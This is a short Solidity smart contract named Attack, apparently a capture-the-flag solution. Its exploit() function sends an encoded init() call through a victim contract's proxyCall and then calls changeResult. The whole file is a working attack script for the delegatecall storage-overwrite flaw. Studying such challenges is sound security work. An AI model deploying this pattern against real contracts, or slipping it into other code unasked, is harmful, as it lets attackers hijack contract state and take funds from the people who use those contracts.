// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    bool private initialized;

    constructor(address addr) payable {
        victim = addr;
    }

    function init() external {
        require(!initialized, "Already initialized");
        initialized = true;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature("init()");
        ID31eg4t3(victim).proxyCall(data);
        ID31eg4t3(victim).changeResult();
    }
}
